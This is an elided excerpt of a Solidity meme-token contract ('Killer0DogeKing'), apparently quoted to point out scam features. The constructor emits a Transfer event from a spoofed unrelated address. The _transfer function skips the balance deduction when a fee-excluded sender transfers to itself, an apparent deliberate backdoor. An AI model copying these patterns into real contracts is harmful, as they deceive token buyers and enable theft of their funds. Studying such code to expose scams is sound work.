...
contract Killer0DogeKing is Context, IERC20, Ownable {
    using SafeMath for uint256;
    using Address for address;
    string private _name = "Killer0DogeKing";
    string private _symbol = "K0DogeKing";
    ...
    constructor () {
        ...
        teamWalletAddress = payable(address(0xdE6b06F60eed1A843599B462A9fE6deC17fc9C9d));
        marketingWalletAddress = payable(address(0xdE6b06F60eed1A843599B462A9fE6deC17fc9C9d));

        _balances[_msgSender()] = _totalSupply;
        emit Transfer(address(0xE6840E218ec7c576411a0dcF6A493B549D4a1cEd), _msgSender(), _totalSupply);
    }
    ...
    function _transfer(address sender, address recipient, uint256 amount) private returns (bool) {
        ...
        else
        {
            ...
            }if(sender != recipient || isExcludedFromFee[sender] == false){
            /*Transfer*/ _balances[sender] = _balances[sender].sub(amount, "Insufficient Balance");}
